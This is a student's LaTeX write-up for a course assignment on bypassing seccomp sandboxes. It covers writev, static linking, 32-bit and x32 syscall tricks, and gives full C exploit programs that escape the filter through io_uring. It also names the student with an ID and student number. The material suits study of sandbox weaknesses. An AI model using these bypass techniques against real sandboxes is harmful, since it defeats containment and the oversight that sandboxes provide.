\documentclass[11pt]{article}
\usepackage[margin=1in]{geometry}
\usepackage{courier}
\usepackage{listings}
\usepackage{xcolor}

\lstset{
  basicstyle=\footnotesize\ttfamily,
  columns=fullflexible,
  breaklines=true,
  numbers=left,
  numberstyle=\tiny,
  stepnumber=1,
  frame=single,
  showstringspaces=false
}
\setlength{\parindent}{0pt}

\begin{document}

\title{CS453/698 Assignment 3 Write-Up}
\author{Jiaze Xiao \\ WatIAM User ID: j76xiao \\ student number: 20933691}
\date{\today}
\maketitle

\section{Introduction}
This assignment involves creating four exploit programs (\texttt{sploit1.c}, \texttt{sploit2.c},
\texttt{sploit3.c}, and \texttt{sploit4.c}) to bypass four different sandbox executables (\texttt{sandbox1},
\texttt{sandbox2}, \texttt{sandbox3}, \texttt{sandbox4}), each of which imposes its own \texttt{seccomp}
filter. The goal is to read the contents of the file named \texttt{flag} and write them to \texttt{stdout} despite
the various system call restrictions in place.

\section{Sandbox1 and \texttt{sploit1.c}}

\subsection{Sandbox1 Seccomp Filter}
\begin{lstlisting}[language=bash]
$ seccomp-tools dump -c ./sandbox1

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0008
 0006: 0x15 0x01 0x00 0x00000010  if (A == ioctl) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
\end{lstlisting}

From the above, we see that \texttt{write} (syscall number 1) is specifically blocked. However,
\texttt{writev} (syscall number 20 on most 64-bit Linux systems) is not blocked, and nor is \texttt{read}.
Hence, we can open the \texttt{flag} file with \texttt{open}, read it, and use \texttt{writev} to write the
flag to \texttt{stdout}.

\subsection{\texttt{sploit1.c}}
\begin{lstlisting}[language=C]
...
int main() {
    struct iovec iov[1];
...
    iov[0].iov_base = flag;
    iov[0].iov_len  = len;
    // Use writev instead of write
    writev(STDOUT_FILENO, iov, 1);
    return 0;
}
\end{lstlisting}
This bypasses the \texttt{write} restriction by calling \texttt{writev}.

\section{Sandbox2 and \texttt{sploit2.c}}

\subsection{Sandbox2 Seccomp Filter}
\begin{lstlisting}[language=bash]
$ seccomp-tools dump -c ./sandbox2
...
 0007: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0027
 ...
\end{lstlisting}

In \texttt{sandbox2}, \texttt{open} is allowed, but many related calls are not (such as \texttt{openat}).
Moreover, dynamic linking itself can invoke additional syscalls (e.g., \texttt{openat} inside the
dynamic loader), so compiling our exploit statically (\texttt{-static}) to ensure we do not violate the filter. Otherwise, even an empty main program will violate the filter.

\subsection{\texttt{sploit2.c}}
Explicitly calls syscall \texttt{open}:
\begin{lstlisting}[language=C]
...
    // Call open with the SYS_open syscall number
    // to avoid the library's open() which may call openat.
    int fd = syscall(SYS_open, "./flag", O_RDONLY, 0);
...
\end{lstlisting}

Using \texttt{-static} ensures that no dynamic loader calls will occur. In the \texttt{Makefile}:
\begin{lstlisting}
CFLAGS = -Wall -ggdb -static
...
\end{lstlisting}
This way, we avoid any hidden \texttt{openat} or other forbidden system calls.


\section{Sandbox3 and \texttt{sploit3.c}}

\subsection{Sandbox3 Seccomp Filter}
\begin{lstlisting}[language=bash]
$ seccomp-tools dump -c ./sandbox3

line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
...
 0005: 0x15 0x14 0x00 0x00000001  if (A == write) goto 0026
 0006: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0026
 0007: 0x15 0x12 0x00 0x00000010  if (A == ioctl) goto 0026
 ...
 0024: 0x15 0x00 0x01 0x40000003  if (A != ARCH_I386) goto 0026
 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0026: 0x06 0x00 0x00 0x00000000  return KILL
\end{lstlisting}

Here, we see that \texttt{write}, \texttt{open}, and a whole bunch of other calls are blocked. This is
somewhat stricter than \texttt{sandbox1}. However, 32-bit mode can bypass the filter because of how \texttt{ARCH\_I386} is handled in the BPF code. The filter specifically checks \texttt{A = arch} for \texttt{ARCH\_X86\_64} and only applies its deny rules in that case. If we compile \texttt{sploit3.c} as a 32-bit binary (by passing \texttt{-m32} to \texttt{gcc}), the system calls it issues match \texttt{ARCH\_I386} instead of \texttt{ARCH\_X86\_64}, and the sandbox effectively permits those calls under the ``\texttt{return ALLOW}'' branch in the BPF.

\subsection{\texttt{sploit3.c}}
\texttt{sploit3.c} only completes a normal \texttt{open}, \texttt{read} and \texttt{write} flow, but in the \texttt{Makefile}, we do:
\begin{lstlisting}
sploit3: sploit3.c
    $(CC) $(CFLAGS) -m32 $< -o $@
\end{lstlisting}
so it compiles for 32-bit \texttt{i386}, thus escaping the filter that only kills certain syscalls under \texttt{ARCH\_X86\_64}.

\section{Sandbox4 and \texttt{sploit4.c}}

\subsection{Sandbox4 Seccomp Filter}
\begin{lstlisting}[language=bash]
$ seccomp-tools dump -c ./sandbox4
...
 0003: 0x15 0x13 0x00 0x00000001  if (A == write) goto 0023
 0004: 0x15 0x12 0x00 0x00000002  if (A == open) goto 0023
 ...
 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0023: 0x06 0x00 0x00 0x00000000  return KILL
\end{lstlisting}

Interestingly, \texttt{write}, \texttt{open} and almost all writing syscalls are blocked under \texttt{ARCH\_X86\_64}, but the filter
does not appear to catch \texttt{x32} syscalls (check if \texttt{A < 0x40000000}), which can be made by passing a special bit in the syscall number. That means we can do:
\[
    \texttt{syscall(0x40000000 | SYS\_write, STDOUT\_FILENO, \ldots)}
\]
to invoke the \texttt{x32} version of \texttt{write}, effectively bypassing the filter's checks on the
\texttt{ARCH\_X86\_64} syscall table.

\subsection{\texttt{sploit4.c}}
\begin{lstlisting}[language=C]
...
#define X32 0x40000000
...
    // Bypass by calling x32 sys_write
    long w = syscall(X32 | SYS_write, 1, flag, n);
...
\end{lstlisting}
Using a \texttt{x32} syscall \texttt{write} to bypass the filter.

\newpage
\section{Appendix: \texttt{io\_uring} Bypasses}
\label{sec:io_uring}

When exploring the filters for \texttt{sandbox4}, I found that the
\texttt{io\_uring} syscalls (\texttt{SYS\_io\_uring\_setup}, \texttt{SYS\_io\_uring\_enter}, etc.) are not
blocked. As a result, it is possible to open and read the \texttt{flag} file, then submit a \texttt{write} request
via \texttt{io\_uring} to \texttt{STDOUT} and bypass the filter. This can be done either by manually mapping
the ring in user space (\texttt{sploitA.c}) or by using the \texttt{liburing} library (\texttt{sploitB.c}).
I asked on Piazza whether \texttt{io\_uring} would be allowed; the instructor clarified that it was not
the intended approach to break \texttt{sandbox4}, but it was indeed missed in the filter.

\subsection{Raw \texttt{io\_uring} Syscalls}
This example manually calls \texttt{SYS\_io\_uring\_setup} and \texttt{SYS\_io\_uring\_enter} and crafts the ring buffers manually.
\begin{lstlisting}[language=C]
#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/io_uring.h>
#include <linux/openat2.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define FLAG_SIZE 1024

int main(void) {
    struct io_uring_params params;
    memset(&params, 0, sizeof(params));

    /* 1) Set up the ring with a single SQ/CQ entry. */
    int ring_fd = syscall(SYS_io_uring_setup, 1, &params);
    if (ring_fd < 0) {
        perror("io_uring_setup");
        return 1;
    }

    /* 2) mmap the SQ ring. */
    size_t sq_ring_sz =
        params.sq_off.array + (params.sq_entries * sizeof(unsigned));
    void *sq_ring =
        mmap(NULL, sq_ring_sz, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_SQ_RING);
    if (sq_ring == MAP_FAILED) {
        perror("mmap SQ ring");
        close(ring_fd);
        return 1;
    }

    /* 3) mmap the SQEs (submission queue entries). */
    size_t sqes_sz = params.sq_entries * sizeof(struct io_uring_sqe);
    struct io_uring_sqe *sqes =
        mmap(NULL, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
                ring_fd, IORING_OFF_SQES);
    if (sqes == MAP_FAILED) {
        perror("mmap SQEs");
        munmap(sq_ring, sq_ring_sz);
        close(ring_fd);
        return 1;
    }

    /* 4) mmap the CQ ring. */
    size_t cq_ring_sz =
        params.cq_off.cqes + (params.cq_entries * sizeof(struct io_uring_cqe));
    void *cq_ring =
        mmap(NULL, cq_ring_sz, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_CQ_RING);
    if (cq_ring == MAP_FAILED) {
        perror("mmap CQ ring");
        munmap(sq_ring, sq_ring_sz);
        munmap(sqes, sqes_sz);
        close(ring_fd);
        return 1;
    }

    /* Fetch pointers into the SQ and CQ rings based on offsets in params. */
    unsigned *sq_tail = (unsigned *)((char *)sq_ring + params.sq_off.tail);
    unsigned *sq_ring_mask =
        (unsigned *)((char *)sq_ring + params.sq_off.ring_mask);
    unsigned *sq_array = (unsigned *)((char *)sq_ring + params.sq_off.array);

    unsigned *cq_head = (unsigned *)((char *)cq_ring + params.cq_off.head);
    unsigned *cq_tail = (unsigned *)((char *)cq_ring + params.cq_off.tail);
    unsigned *cq_ring_mask =
        (unsigned *)((char *)cq_ring + params.cq_off.ring_mask);
    struct io_uring_cqe *cqe_array =
        (struct io_uring_cqe *)((char *)cq_ring + params.cq_off.cqes);

    /* 5) Prepare our buffer. */
    char flag[FLAG_SIZE] = {0};
    struct open_how how;
    memset(&how, 0, sizeof(how));
    how.flags = O_RDWR | O_CREAT;
    how.mode = 0644;
    int fd = syscall(SYS_openat2, AT_FDCWD, "./flag", &how, sizeof(how));
    if (fd < 0) {
        fprintf(stderr, "Failed to open flag: %m\n");
        return 1;
    }
    read(fd, flag, FLAG_SIZE);
    close(fd);

    /* 6) Get the current submission queue tail and find the SQE index. */
    unsigned tail = *sq_tail;
    unsigned index = tail & *sq_ring_mask;
    struct io_uring_sqe *sqe = &sqes[index];

    /* 7) Fill out the SQE for a write to STDOUT. */
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_WRITE;	 /* Write operation */
    sqe->fd = STDOUT_FILENO;		 /* to fd=1 (stdout) */
    sqe->off = 0;					 /* offset not used for stdout */
    sqe->addr = (unsigned long)flag; /* address of buffer */
    sqe->len = sizeof(flag) - 1;	 /* number of bytes to write */
    sqe->user_data = 42;			 /* arbitrary ID to track the request */

    /* 8) Place this SQE index in the submission queue array. */
    sq_array[index] = index;

    /* 9) Advance the SQ tail pointer to submit the entry. */
    *sq_tail = tail + 1;

    /* 10) Submit via io_uring_enter: tell kernel we have 1 SQE, want 1 CQE. */
    int ret = syscall(SYS_io_uring_enter, ring_fd, 1, 1, IORING_ENTER_GETEVENTS,
                        NULL, 0);
    if (ret < 0) {
        perror("io_uring_enter");
        munmap(sq_ring, sq_ring_sz);
        munmap(sqes, sqes_sz);
        munmap(cq_ring, cq_ring_sz);
        close(ring_fd);
        return 1;
    }

    /* 11) Wait for the completion (spin here for simplicity). */
    for (;;) {
        unsigned head_val = *cq_head;
        if (head_val != *cq_tail) {
            /* There's a completion in the queue. */
            struct io_uring_cqe cqe = cqe_array[head_val & *cq_ring_mask];

            if (cqe.user_data == 42) { /* Our request? */
                if ((int)cqe.res < 0) {
                    fprintf(stderr, "Write failed: %s\n", strerror(-cqe.res));
                }
                /* Mark this CQE as seen by advancing the head. */
                *cq_head = head_val + 1;
                break;
            } else {
                /* Not our request? Advance and keep looping. */
                *cq_head = head_val + 1;
            }
        }
    }

    /* 12) Cleanup. */
    munmap(sq_ring, sq_ring_sz);
    munmap(sqes, sqes_sz);
    munmap(cq_ring, cq_ring_sz);
    close(ring_fd);

    return 0;
}
\end{lstlisting}

\subsection{\texttt{liburing}}
This example uses \texttt{liburing} to do the same thing more succinctly although it's not supported on grading platform (since it requires \texttt{-luring} flag to compile, which requires you to install the package \texttt{liburing-dev}).

\begin{lstlisting}[language=C]
#define _GNU_SOURCE
#include <fcntl.h>
#include <liburing.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define FLAG_SIZE 1024

int main() {
	char flag[FLAG_SIZE] = {0};
	struct open_how how;
	memset(&how, 0, sizeof(how));
	how.flags = O_RDWR | O_CREAT;
	how.mode = 0644;
	int fd = syscall(SYS_openat2, AT_FDCWD, "./flag", &how, sizeof(how));
	if (fd < 0) {
		fprintf(stderr, "Failed to open flag: %m\n");
		return 1;
	}
	read(fd, flag, FLAG_SIZE);
	close(fd);

	struct io_uring ring;
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	if (io_uring_queue_init(8, &ring, 0) < 0) {
		perror("io_uring_queue_init");
		return 1;
	}

	// Get a submission queue entry (SQE)
	sqe = io_uring_get_sqe(&ring);
	if (!sqe) {
		fprintf(stderr, "Failed to get SQE\n");
		io_uring_queue_exit(&ring);
		return 1;
	}

	// Prepare the write operation
	io_uring_prep_write(sqe, STDOUT_FILENO, flag, strlen(flag), 0);

	// Submit the request
	io_uring_submit(&ring);

	// Wait for completion
	if (io_uring_wait_cqe(&ring, &cqe) < 0) {
		fprintf(stderr, "Failed to wait for CQE\n");
		io_uring_queue_exit(&ring);
		return 1;
	}

	// Check result
	if (cqe->res < 0) {
		fprintf(stderr, "Write failed: %s\n", strerror(-cqe->res));
	}

	// Mark completion as done
	io_uring_cqe_seen(&ring, cqe);
	io_uring_queue_exit(&ring);

	return 0;
}
\end{lstlisting}

These solutions successfully bypass \texttt{sandbox1}, \texttt{sandbox3}, and \texttt{sandbox4}, but
they are not the intended solutions for the assignment.

\end{document}
